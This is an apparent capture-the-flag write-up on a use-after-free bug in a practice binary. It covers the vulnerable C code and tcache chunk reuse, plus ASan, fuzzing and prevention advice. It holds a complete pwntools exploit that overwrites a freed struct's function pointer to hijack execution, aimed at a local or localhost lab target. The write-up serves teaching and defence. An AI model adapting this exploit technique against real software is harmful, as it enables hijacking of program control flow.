# Challenge 16: Use-After-Free (UAF)

## Difficulty: Easy-Medium

## Vulnerability Type: Use-After-Free (UAF)

## Description
Classic Use-After-Free vulnerability. The program frees memory but continues to use it, allowing us to control freed chunks and hijack execution.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial
- **tcache**: Enabled (glibc 2.27+)

## Vulnerability Analysis

### The Bug
```c
void delete_user() {
    free(user);
    // Bug: should set user = NULL here!
}

void show_user() {
    user->print(user);  // Dereferences freed pointer!
}

void edit_user() {
    read(0, user->name, ...);  // Writes to freed memory!
}
```

After `free(user)`, the pointer still points to freed memory. Operations on it cause undefined behavior that we can exploit.

## Structure Layout
```c
typedef struct {
    void (*print)(struct User*);  // 8 bytes - function pointer!
    char name[32];                // 32 bytes
    int id;                       // 4 bytes
} User;  // Total: 48 bytes (with padding)
```

## Exploitation Strategy

### UAF Attack Pattern
1. Create user (allocates chunk)
2. Delete user (frees chunk, but pointer remains)
3. Create new user (reuses same chunk)
4. First user's function pointer is now controlled by new user's data!

### Step-by-Step
```python
# Step 1: Create first user
choice = 1
name = "AAAA"  # Doesn't matter

# Step 2: Delete user (UAF created)
choice = 2

# Step 3: Create new user with function pointer in name
choice = 1
name = p64(admin_print_addr) + b"BBBB..."
# This overwrites the freed chunk
# The function pointer is at offset 0

# Step 4: Show first user (calls function pointer)
choice = 3
# Calls admin_print instead of normal_print!
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9016)
else:
    p = process('./challenge')

# Get admin_print address
p.recvuntil(b'admin_print: ')
admin_print = int(p.recvline().strip(), 16)
log.info(f"admin_print: {hex(admin_print)}")

# Create first user
p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'name: ', b'victim\n')

# Delete user (create UAF condition)
p.sendlineafter(b'Choice: ', b'2')

# Create new user, overwriting freed chunk
# The function pointer is at offset 0 of User struct
p.sendlineafter(b'Choice: ', b'1')
payload = p64(admin_print)  # Overwrite function pointer
payload += b'A' * 24        # Fill rest of name
p.sendafter(b'name: ', payload)

# Trigger UAF by showing first user
# This calls the function pointer we just overwrote
p.sendlineafter(b'Choice: ', b'3')

p.interactive()
```

## Heap Behavior

### tcache (Thread Local Cache)
Modern glibc uses tcache for small allocations:
- Fast allocation/free
- LIFO (Last In, First Out)
- Minimal security checks (in older versions)

When we:
1. `malloc(48)` -> Gets chunk A
2. `free(chunk A)` -> Goes to tcache
3. `malloc(48)` -> Gets same chunk A back!

### Memory Reuse
```
Initial:
[User struct: print=normal_print | name=... | id=...]

After free:
[Freed chunk: forward_ptr | ...]

After new malloc with our data:
[User struct: print=admin_print | name=... | id=...]
                     ^^^^^^^^^^^^
                     We control this!
```

## Automated Detection

### Static Analysis
- `free()` call without NULL assignment
- Pointer used after `free()`
- Missing NULL checks

### Dynamic Analysis
- AddressSanitizer: Detects UAF at runtime
- Valgrind: Memory error detection

```bash
# Compile with sanitizer
gcc -fsanitize=address -g challenge.c -o challenge

# Run and it will catch UAF
./challenge
```

### Fuzzing
AFL++ with ASAN can find UAF bugs:
```bash
afl-clang-fast -fsanitize=address challenge.c -o challenge
afl-fuzz -i input -o output -m none ./challenge
```

## Real-World Examples
- CVE-2014-1776: Internet Explorer UAF
- CVE-2015-5119: Flash Player UAF
- CVE-2016-0189: Internet Explorer Scripting Engine UAF
- Many browser exploits involve UAF

## Prevention

### Nullify Pointers
```c
free(user);
user = NULL;  // ✓ Prevents use-after-free
```

### Reference Counting
```c
void delete_user() {
    user->refcount--;
    if (user->refcount == 0) {
        free(user);
        user = NULL;
    }
}
```

### Modern Mitigations
- tcache double-free check (glibc 2.29+)
- Safe unlinking
- Heap randomization
- Control-Flow Integrity (CFI)

## Learning Objectives
- Understanding Use-After-Free
- Heap allocation/free behavior
- tcache mechanics
- Function pointer hijacking
- Memory lifecycle bugs
- Temporal memory safety

## Advanced Exploitation

### If No Function Pointer
Without a function pointer, UAF can still:
- Corrupt heap metadata
- Create overlapping chunks
- Leak heap addresses
- Enable arbitrary read/write

### Double-Free
```c
free(ptr);
free(ptr);  // Double-free!
// Can corrupt heap structures
```

## Debugging with GDB
```gdb
# Watch heap operations
b malloc
b free

# Examine heap chunks
x/20gx <chunk_address>

# Use heap commands (gef/pwndbg)
heap chunks
vis_heap_chunks
```
